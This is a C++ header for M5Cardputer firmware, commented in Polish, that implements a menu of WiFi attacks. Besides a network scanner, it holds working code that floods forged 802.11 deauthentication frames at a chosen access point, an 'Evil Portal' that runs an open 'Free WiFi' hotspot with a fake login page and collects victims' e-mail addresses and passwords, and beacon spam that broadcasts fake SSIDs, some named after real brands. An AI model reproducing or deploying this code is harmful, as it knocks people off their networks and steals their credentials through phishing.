#pragma once
// app_wifi_atk.h — Ataki WiFi dla CardputerOS3
// Deauth, Evil Portal, Beacon Spam, Skan sieci

#include "M5Cardputer.h"
#include "core/theme.h"
#include "core/ui.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>

// ── STRUKTURY ─────────────────────────────────────────
struct APInfo {
    String   ssid;
    uint8_t  bssid[6];
    int      rssi;
    int      channel;
    int      enc;
};

static std::vector<APInfo> _ap_list;

static bool _atk_check_esc() {
    M5Cardputer.update();
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return false;
    auto s = M5Cardputer.Keyboard.keysState();
    if (s.fn) { for (char c : s.word) { if (c=='q'||c=='Q') return true; } }
    else { for (char c : s.word) { if (c==27) return true; } }
    return false;
}

// ── SKAN SIECI ────────────────────────────────────────
static void _wifi_do_scan() {
    _ap_list.clear();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
        APInfo ap;
        ap.ssid    = WiFi.SSID(i);
        ap.rssi    = WiFi.RSSI(i);
        ap.channel = WiFi.channel(i);
        ap.enc     = WiFi.encryptionType(i);
        uint8_t* b = WiFi.BSSID(i);
        memcpy(ap.bssid, b, 6);
        _ap_list.push_back(ap);
    }
    WiFi.scanDelete();
}

// ── WYBÓR SIECI Z LISTY ───────────────────────────────
static int _select_ap(const char* title) {
    ui_draw_header(title, THEME_RED);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4, 28); M5Cardputer.Display.print("Skanuję sieci...");
    _wifi_do_scan();

    if (_ap_list.empty()) {
        ui_show_info("Brak sieci WiFi!", THEME_RED);
        delay(2000); return -1;
    }

    int sel = 0, offset = 0;
    const int ROWS = 5;
    bool redraw = true;

    while (true) {
        if (redraw) {
            ui_draw_header(title, THEME_RED);
            char hdr[20]; snprintf(hdr, sizeof(hdr), "%d sieci", (int)_ap_list.size());
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(185, 6); M5Cardputer.Display.print(hdr);

            for (int i = 0; i < ROWS && (i+offset) < (int)_ap_list.size(); i++) {
                int idx = i + offset;
                bool a = (idx == sel);
                if (a) M5Cardputer.Display.fillRect(2, 22+i*19, 236, 18, THEME_RED>>2);
                M5Cardputer.Display.setTextColor(a ? THEME_RED : THEME_TEXT);
                M5Cardputer.Display.setCursor(6, 26+i*19);
                String n = _ap_list[idx].ssid.length()>0 ? _ap_list[idx].ssid : "<ukryta>";
                if (n.length()>20) n = n.substring(0,19)+"~";
                M5Cardputer.Display.print(n);
                M5Cardputer.Display.setTextColor(THEME_MUTED);
                M5Cardputer.Display.setCursor(190, 26+i*19);
                M5Cardputer.Display.print(_ap_list[idx].rssi);
            }
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 125);
            M5Cardputer.Display.print("FN+;/. nav  ENTER=wybierz  ESC=wr");
            redraw = false;
        }

        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            auto s = M5Cardputer.Keyboard.keysState();
            if (s.fn) {
                if (_word_eq(s.word, ";")) { if(sel>0){sel--;if(sel<offset)offset--;} redraw=true; }
                if (_word_eq(s.word, ".")) { if(sel<(int)_ap_list.size()-1){sel++;if(sel>=offset+ROWS)offset++;} redraw=true; }
                for (char c : s.word) { if (c=='q'||c=='Q') return -1; }
            } else {
                for (char c : s.word) {
                    if (c=='\n'||c=='\r') return sel;
                    if (c==27) return -1;
                }
            }
        }
        if (M5Cardputer.BtnA.wasPressed()) return sel;
        delay(10);
    }
}

// ── SKAN PODGLĄD ──────────────────────────────────────
void app_wifi_scan_view() {
    ui_draw_header("SKAN SIECI", THEME_CYAN);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4, 28); M5Cardputer.Display.print("Skanuję...");
    _wifi_do_scan();

    if (_ap_list.empty()) { ui_show_info("Brak sieci!", THEME_RED); delay(2000); return; }

    int sel = 0, offset = 0;
    const int ROWS = 5;
    bool redraw = true;

    while (true) {
        if (redraw) {
            ui_draw_header("SKAN SIECI", THEME_CYAN);
            char hdr[20]; snprintf(hdr, sizeof(hdr), "%d sieci", (int)_ap_list.size());
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(185, 6); M5Cardputer.Display.print(hdr);

            for (int i = 0; i < ROWS && (i+offset) < (int)_ap_list.size(); i++) {
                int idx = i + offset;
                bool a = (idx == sel);
                if (a) M5Cardputer.Display.fillRect(2, 22+i*19, 236, 18, THEME_CYAN>>2);
                M5Cardputer.Display.setTextColor(a ? THEME_CYAN : THEME_TEXT);
                M5Cardputer.Display.setCursor(6, 26+i*19);
                String n = _ap_list[idx].ssid.length()>0 ? _ap_list[idx].ssid : "<ukryta>";
                if (n.length()>20) n = n.substring(0,19)+"~";
                M5Cardputer.Display.print(n);
                M5Cardputer.Display.setTextColor(THEME_MUTED);
                M5Cardputer.Display.setCursor(175, 26+i*19);
                char info[14]; snprintf(info, sizeof(info), "CH%d %d", _ap_list[idx].channel, _ap_list[idx].rssi);
                M5Cardputer.Display.print(info);
            }
            M5Cardputer.Display.setTextColor(THEME_MUTED);
            M5Cardputer.Display.setCursor(4, 125);
            M5Cardputer.Display.print("ENTER=info  R=rescan  ESC=wyjdz");
            redraw = false;
        }

        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
            auto s = M5Cardputer.Keyboard.keysState();
            if (s.fn) {
                if (_word_eq(s.word, ";")) { if(sel>0){sel--;if(sel<offset)offset--;} redraw=true; }
                if (_word_eq(s.word, ".")) { if(sel<(int)_ap_list.size()-1){sel++;if(sel>=offset+ROWS)offset++;} redraw=true; }
                for (char c : s.word) { if (c=='q'||c=='Q') { WiFi.mode(WIFI_OFF); return; } }
            } else {
                for (char c : s.word) {
                    if (c=='\n'||c=='\r') {
                        APInfo& ap = _ap_list[sel];
                        ui_draw_header("INFO SIECI", THEME_CYAN);
                        M5Cardputer.Display.setTextColor(THEME_CYAN);
                        M5Cardputer.Display.setCursor(4,26); M5Cardputer.Display.print("SSID: "+ap.ssid);
                        M5Cardputer.Display.setTextColor(THEME_TEXT);
                        char buf[40];
                        snprintf(buf, sizeof(buf), "MAC: %02X:%02X:%02X:%02X:%02X:%02X",
                                 ap.bssid[0],ap.bssid[1],ap.bssid[2],ap.bssid[3],ap.bssid[4],ap.bssid[5]);
                        M5Cardputer.Display.setCursor(4,42); M5Cardputer.Display.print(buf);
                        snprintf(buf, sizeof(buf), "Kanal: %d  RSSI: %d dBm", ap.channel, ap.rssi);
                        M5Cardputer.Display.setCursor(4,58); M5Cardputer.Display.print(buf);
                        const char* enc_names[] = {"Open","WEP","WPA","WPA2","WPA/2","EAP","WPA3","WPA3/2"};
                        snprintf(buf, sizeof(buf), "Szyfrowanie: %s", ap.enc<8 ? enc_names[ap.enc] : "?");
                        M5Cardputer.Display.setCursor(4,74); M5Cardputer.Display.print(buf);
                        M5Cardputer.Display.setTextColor(THEME_MUTED);
                        M5Cardputer.Display.setCursor(4,125); M5Cardputer.Display.print("ENTER=powrot");
                        bool waiting = true;
                        while (waiting) {
                            M5Cardputer.update();
                            if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
                                auto s2 = M5Cardputer.Keyboard.keysState();
                                for (char c2 : s2.word) { if (c2=='\n'||c2=='\r'||c2==27) { waiting=false; break; } }
                            }
                            if (M5Cardputer.BtnA.wasPressed()) waiting=false;
                            delay(10);
                        }
                        redraw = true;
                    }
                    if (c=='r'||c=='R') { _wifi_do_scan(); sel=0; offset=0; redraw=true; }
                    if (c==27) { WiFi.mode(WIFI_OFF); return; }
                }
            }
        }
        if (M5Cardputer.BtnA.wasPressed()) { WiFi.mode(WIFI_OFF); return; }
        delay(10);
    }
}

// ── DEAUTHENTICATION ──────────────────────────────────
void app_wifi_deauth() {
    int idx = _select_ap("DEAUTH ATTACK");
    if (idx < 0) return;

    APInfo& target = _ap_list[idx];

    uint8_t frame[26] = {
        0xC0,0x00,0x3A,0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // dst broadcast
        0x00,0x00,0x00,0x00,0x00,0x00,   // src = AP BSSID
        0x00,0x00,0x00,0x00,0x00,0x00,   // bssid = AP
        0xF0,0xFF,0x02,0x00
    };
    memcpy(frame+10, target.bssid, 6);
    memcpy(frame+16, target.bssid, 6);

    ui_draw_header("DEAUTH", THEME_RED);
    M5Cardputer.Display.setTextColor(THEME_RED);
    M5Cardputer.Display.setCursor(4, 26);
    M5Cardputer.Display.print("Cel: " + (target.ssid.length()>0 ? target.ssid : String("<ukryta>")));
    M5Cardputer.Display.setTextColor(THEME_MUTED);
    M5Cardputer.Display.setCursor(4, 125); M5Cardputer.Display.print("FN+Q = stop");

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);

    int count = 0;
    while (!_atk_check_esc()) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        count++;
        if (count % 50 == 0) {
            M5Cardputer.Display.fillRect(4,42,220,14,THEME_BG);
            M5Cardputer.Display.setTextColor(THEME_ORANGE);
            M5Cardputer.Display.setCursor(4,44);
            char buf[28]; snprintf(buf, sizeof(buf), "Wyslano ramek: %d", count);
            M5Cardputer.Display.print(buf);
        }
        delay(1);
    }
    esp_wifi_stop();
    esp_wifi_deinit();
    WiFi.mode(WIFI_OFF);
}

// ── EVIL PORTAL ───────────────────────────────────────
void app_wifi_evil_portal() {
    String epSSID = "Free WiFi";
    std::vector<String> captured;

    ui_draw_header("EVIL PORTAL", THEME_RED);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4,26); M5Cardputer.Display.print("AP: " + epSSID);
    M5Cardputer.Display.setCursor(4,40); M5Cardputer.Display.print("IP: 192.168.4.1");
    M5Cardputer.Display.setTextColor(THEME_MUTED);
    M5Cardputer.Display.setCursor(4,125); M5Cardputer.Display.print("FN+Q = stop");

    WiFi.mode(WIFI_AP);
    WiFi.softAP(epSSID.c_str(), "", 6, 0);
    delay(500);

    DNSServer dns;
    dns.start(53, "*", IPAddress(192,168,4,1));

    WebServer server(80);
    String html = "<html><body style='background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding:40px'>"
                  "<h2>WiFi Login</h2><form method='POST' action='/login'>"
                  "<input name='email' type='email' placeholder='E-mail' style='width:80%;padding:10px;margin:5px'><br>"
                  "<input name='pass' type='password' placeholder='Haslo' style='width:80%;padding:10px;margin:5px'><br>"
                  "<button type='submit' style='padding:10px 30px;background:#e94560;color:#fff;border:none'>Zaloguj</button>"
                  "</form></body></html>";

    server.on("/", [&]() { server.send(200, "text/html", html); });
    server.on("/login", HTTP_POST, [&]() {
        String entry = server.arg("email") + " : " + server.arg("pass");
        captured.push_back(entry);
        server.send(200, "text/html", "<html><body style='background:#1a1a2e;color:#fff;text-align:center;padding:50px'><h2>Laczenie...</h2></body></html>");
    });
    server.onNotFound([&]() { server.sendHeader("Location","http://192.168.4.1"); server.send(302); });
    server.begin();

    int lastCount = 0;
    while (!_atk_check_esc()) {
        dns.processNextRequest();
        server.handleClient();
        if ((int)captured.size() != lastCount) {
            lastCount = captured.size();
            M5Cardputer.Display.fillRect(4,56,236,50,THEME_BG);
            M5Cardputer.Display.setTextColor(THEME_GREEN);
            M5Cardputer.Display.setCursor(4,58);
            char buf[24]; snprintf(buf,sizeof(buf),"Prz.%d: ",lastCount);
            M5Cardputer.Display.print(buf);
            M5Cardputer.Display.setTextColor(THEME_CYAN);
            M5Cardputer.Display.setCursor(4,72);
            String last = captured.back();
            if (last.length()>35) last=last.substring(0,35);
            M5Cardputer.Display.print(last);
        }
        delay(10);
    }

    server.stop(); dns.stop();
    WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);

    if (!captured.empty()) {
        ui_draw_header("PRZECHWYCONE", THEME_RED);
        int y = 24;
        for (auto& c : captured) {
            if (y>115) break;
            M5Cardputer.Display.setTextColor(THEME_CYAN);
            M5Cardputer.Display.setCursor(4,y);
            String l = c.length()>35 ? c.substring(0,35) : c;
            M5Cardputer.Display.print(l);
            y += 14;
        }
        M5Cardputer.Display.setTextColor(THEME_MUTED);
        M5Cardputer.Display.setCursor(4,125); M5Cardputer.Display.print("ENTER=wyjdz");
        while (true) {
            M5Cardputer.update();
            if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
                auto s = M5Cardputer.Keyboard.keysState();
                for (char c : s.word) { if (c=='\n'||c=='\r'||c==27) return; }
            }
            if (M5Cardputer.BtnA.wasPressed()) return;
            delay(10);
        }
    }
}

// ── BEACON SPAM ───────────────────────────────────────
void app_wifi_beacon_spam() {
    static const char* ssids[] = {
        "Free_Public_WiFi","Starbucks_Guest","McDonalds_WiFi",
        "Airport_Free_WiFi","Hotel_Guest","xfinitywifi",
        "FBI_Surveillance","Not_Your_WiFi","Pretty_Fly_WiFi",
        "TellMyWifiLoveHer","WuTangLAN","Bill_Wi_Savages",
        "PretendHome","HideYoKidsHideYoWifi","Virus.exe",
        "Router_DMZ","NoMoreMrWiFiGuy","ATT_WiFi",
    };
    const int N = 18;

    ui_draw_header("BEACON SPAM", THEME_ORANGE);
    M5Cardputer.Display.setTextColor(THEME_TEXT);
    M5Cardputer.Display.setCursor(4,26); M5Cardputer.Display.print("Tworze falszywych sieci...");
    M5Cardputer.Display.setTextColor(THEME_MUTED);
    M5Cardputer.Display.setCursor(4,125); M5Cardputer.Display.print("FN+Q = stop");

    int count = 0;
    while (!_atk_check_esc()) {
        for (int i = 0; i < N && !_atk_check_esc(); i++) {
            WiFi.mode(WIFI_AP);
            WiFi.softAP(ssids[i], "", (count%13)+1, 0);
            delay(30);
            WiFi.softAPdisconnect(false);
            count++;
        }
        if (count % 18 == 0) {
            M5Cardputer.Display.fillRect(4,42,220,14,THEME_BG);
            M5Cardputer.Display.setTextColor(THEME_ORANGE);
            M5Cardputer.Display.setCursor(4,44);
            char buf[32]; snprintf(buf,sizeof(buf),"Wyslano: %d beaconow",count);
            M5Cardputer.Display.print(buf);
        }
    }
    WiFi.mode(WIFI_OFF);
}

// ── GŁÓWNE MENU ───────────────────────────────────────
void app_wifi_atk_menu() {
    while (true) {
        const char* opts[] = {"Skan sieci","Deauthentication","Evil Portal","Beacon Spam"};
        int sel = ui_select_list(opts, 4, "WiFi ATAKI", THEME_RED);
        if (sel < 0) return;
        if (sel == 0) app_wifi_scan_view();
        if (sel == 1) app_wifi_deauth();
        if (sel == 2) app_wifi_evil_portal();
        if (sel == 3) app_wifi_beacon_spam();
    }
}

